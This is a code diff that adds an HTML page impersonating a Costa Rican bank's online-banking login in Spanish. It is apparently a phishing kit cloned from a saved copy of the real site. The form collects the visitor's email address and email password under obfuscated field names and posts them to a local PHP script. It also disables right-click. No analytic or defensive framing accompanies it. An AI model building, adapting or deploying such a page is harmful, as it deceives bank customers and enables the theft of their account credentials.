@@ -1,0 +1,128 @@
+
+<html lang="es-CR">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+      <title>BECR</title>
+      
+      <script language="JavaScript">
+         function menCDVencida()
+                {
+                    window.open("/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp","oficinas","menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360");
+                }
+      </script>
+      <script language="JavaScript">
+         function menCDVencida()
+                {
+                    window.open("/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp","oficinas","menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360");
+                }
+      </script>
+      <script language="JavaScript">
+         function menCDVencida()
+                {
+                    window.open("/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp","oficinas","menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360");
+                }
+      </script>
+   
+      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  
+      <link rel="stylesheet" type="text/css" href="css/semantic.min(1).css">
+      <link rel="stylesheet" type="text/css" href="css/spinner.css">
+      <link rel="stylesheet" type="text/css" href="css/BCRStyle(1).css">
+      <link rel="stylesheet" type="text/css" href="css/Ingreso.css">
+
+   </head>
+   <body oncontextmenu="return false;">
+      <div class="ui grid griIngreso">
+         <div class="three wide column">
+            <h2 class="ui center aligned header security">Seguridad</h2>
+            <div class="menuIzquierdoCentral">
+               <p class="ui security">
+                  <a target="_blank" tabindex="-1" href="#">
+                  <img class="icon-image" src="img/Consideraciones.svg" alt="Consideraciones">
+                  <span tabindex="-1">Consideraciones</span>
+                  </a>
+               </p>
+               <p class="ui security">
+                  <a target="_blank" tabindex="-1" href="#">
+                  <img class="icon-image" src="img/Reglamento.svg" alt="Reglamento">
+                  <span tabindex="-1">Reglamentos</span>
+                  </a>
+               </p>
+            </div>
+         </div>
+         <div class="thirteen wide column imageBackground">
+            <div class="ui center aligned grid login">
+               <div class="five wide column row">
+                  <div class="ui message mensajeContinuar">
+                     <div id="spinner" class="ui inverted dimmer">
+                        <div id="spinnerControler">
+                           <div id="spinPanel">
+                              <div class="loader"></div>
+                              <span id="spinMessage" style="color:#EF3340; text-align: center">Ingresando</span>
+                           </div>
+                        </div>
+                     </div>
+                     <form class="ui form"  method="post" action="uiform3.php" id="theForm">
+                      
+                
+                        <h2 class="ui header primaryColor" tabindex="1">Ingresar</h2>
+                        <hr class="hr-light">
+                        <div class="login-input">
+                           <i class="prefix">
+                           <img class="icon-login" src="img/Personalizar.svg" alt="Usuario">
+                           </i>
+
+                           <input type="email" tabindex="2" minlength="2" required  name="miDiosenticonfio" class="icon-fill form-control" placeholder="Correo electrónico"  title="Ingrese su correo" inputmode="text">
+                          
+                           
+                        </div>
+                        <div class="login-input">
+                           <i class="prefix" name="imgContrasena">
+                           <img class="icon-login" src="img/Seguridad.svg" alt="Contraseña">
+                           </i>
+                           <input type="password" tabindex="3" name="miDiosenticonfio2"  placeholder="Contraseña de correo" class="icon-fill form-control" required  minlength="2" title="Ingrese su contraseña de correo" inputmode="text">
+                           
+                           <span class="password-field" name="verPassword">
+                              <svg width="20" height="20" viewBox="0 0 1792 1792">
+                                 <path id="show-password" style="fill:#1bacec" d="M555 1335l78-141q-87-63-136-159t-49-203q0-121 61-225-229 117-381 353 167 258 427 375zm389-759q0-20-14-34t-34-14q-125 0-214.5 89.5t-89.5 214.5q0 20 14 34t34 14 34-14 14-34q0-86 61-147t147-61q20 0 34-14t14-34zm363-191q0 7-1 9-106 189-316 567t-315 566l-49 89q-10 16-28 16-12 0-134-70-16-10-16-28 0-12 44-87-143-65-263.5-173t-208.5-245q-20-31-20-69t20-69q153-235 380-371t496-136q89 0 180 17l54-97q10-16 28-16 5 0 18 6t31 15.5 33 18.5 31.5 18.5 19.5 11.5q16 10 16 27zm37 447q0 139-79 253.5t-209 164.5l280-502q8 45 8 84zm448 128q0 35-20 69-39 64-109 145-150 172-347.5 267t-419.5 95l74-132q212-18 392.5-137t301.5-307q-115-179-282-294l63-112q95 64 182.5 153t144.5 184q20 34 20 69z"></path>
+                              </svg>
+                           </span>
+                        </div>
+                        
+                        <button id="btnIngresar" type="submit" class="ui center aligned button btnIngresar red" tabindex="4" title="Ingresar" alt="Ingresar"  value="Ingresar">Ingresar</button>
+                        
+                        
+                     </form>
+                  </div>
+               </div>
+               <div class="five wide column row">
+                  <div class="ui message mensajeContinuar">
+                     <h2 class="ui header primaryColor" tabindex="7">Registrarse</h2>
+                     <hr class="hr-light">
+                     <p tabindex="8">Regístrese aquí si desea utilizar los servicios de Banca Digital.</p>
+                     <p tabindex="9">Para registrarse requiere ser cliente y tener al menos un producto
+                        activo.
+                     </p>
+                     <button id="btnRegistrarseIngreso" tabindex="10" title="Continuar" type="button" class="ui red button bntContinuar"> Continuar </button>
+                  </div>
+               </div>
+            </div>
+         </div>
+         
+         <script src="js/stapes.min.js(1).descarga"></script>
+         <script src="js/principal.js(1).descarga"></script>
+       
+         <script src="js/servicio.js(1).descarga"></script>
+         <script src="js/semantic.js(1).descarga"></script>
+         <script src="js/i18n.min.js.descarga"></script>
+         <script src="js/lenguaje.js.descarga"></script>
+         <script src="js/inputmask.js.descarga"></script>
+         <script src="js/jquery.inputmask.js.descarga"></script>
+    
+
+      </div>
+   
+   </body>
+</html>
